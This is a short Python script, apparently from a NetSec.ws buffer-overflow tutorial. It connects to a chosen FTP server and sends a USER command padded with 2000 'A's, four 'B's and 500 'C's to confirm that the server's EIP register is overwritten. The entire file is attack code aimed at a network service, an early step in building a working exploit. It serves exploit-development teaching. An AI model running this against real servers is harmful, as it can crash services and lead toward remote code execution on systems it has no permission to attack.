# Confirming EIP Overwrite
# Written for NetSec.ws
 
import sys, socket, time
 
# Use in the form "python fuzzer.py  "
 
host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user
 
# EIP Writing Pattern
pattern = "A"*2000 + "B"*4 + "C"*500
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address
client.recv(1024) # Recieve FTP Banner
client.send("USER " + pattern) # Send the user command with a variable length name
client.close() # Close the Connection
